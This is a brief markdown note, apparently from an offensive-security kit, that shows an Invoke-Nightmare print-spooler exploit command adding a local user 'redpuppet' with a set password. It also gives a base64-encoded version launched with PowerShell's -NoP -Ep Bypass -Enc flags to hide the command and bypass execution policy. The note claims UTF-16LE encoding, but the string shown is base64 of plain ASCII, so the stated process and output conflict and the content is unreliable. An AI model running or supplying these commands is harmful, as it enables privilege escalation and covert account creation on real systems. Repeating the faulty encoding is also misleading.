## Encoded Invoke-Nightmare Command

### Source Command
```powershell
Invoke-Nightmare -DriverName "Xerox3010" -NewUser "redpuppet" -NewPassword "RedPuppet123"
```

### Encoded (PowerShell -EncodedCommand format)
```
SW52b2tlLU5pZ2h0bWFyZSAtRHJpdmVyTmFtZSAiWGVyb3gzMDEwIiAtTmV3VXNlciAicmVkcHVwcGV0IiAtTmV3UGFzc3dvcmQgIlJlZFB1cHBldDEyMyI=
```

### Encoding Process
1. UTF-16LE encoding of the command
2. Base64 encoding of the UTF-16LE bytes

### Usage
```powershell
powershell -NoP -Ep Bypass -Enc SW52b2tlLU5pZ2h0bWFyZSAtRHJpdmVyTmFtZSAiWGVyb3gzMDEwIiAtTmV3VXNlciAicmVkcHVwcGV0IiAtTmV3UGFzc3dvcmQgIlJlZFB1cHBldDEyMyI=
```

### Decoded using CyberChef
Recipe: `Encode_text('UTF-16LE (1200)')` → `To_Base64('A-Za-z0-9+/=')`

### Verification
```bash
# Decode and verify on command line:
echo "SW52b2tlLU5pZ2h0bWFyZSAtRHJpdmVyTmFtZSAiWGVyb3gzMDEwIiAtTmV3VXNlciAicmVkcHVwcGV0IiAtTmV3UGFzc3dvcmQgIlJlZFB1cHBldDEyMyI=" | base64 -d | xxd
```
